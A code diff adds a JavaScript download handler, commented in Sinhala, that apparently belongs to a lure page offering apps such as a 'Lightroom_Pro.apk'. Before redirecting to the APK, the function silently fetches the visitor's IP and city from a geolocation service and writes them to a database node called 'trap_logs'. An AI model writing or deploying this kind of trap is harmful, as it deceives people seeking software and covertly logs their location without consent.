@@ -1,0 +1,16 @@
+function trackDownload(appName) {
+        fetch('https://ipapi.co/json/')
+        .then(res => res.json())
+        .then(data => {
+            db.ref('trap_logs').push({
+                app: appName,
+                ip: data.ip,
+                city: data.city,
+                time: new Date().toLocaleString()
+            });
+            
+            // මේක තමයි APK එක බාගන්න යන ලින්ක් එක
+            // උදා: Lightroom_Pro.apk කියලා එකක් උඹ GitHub එකට දානවා නම්:
+            window.location.href = appName + ".apk"; 
+        });
+    }
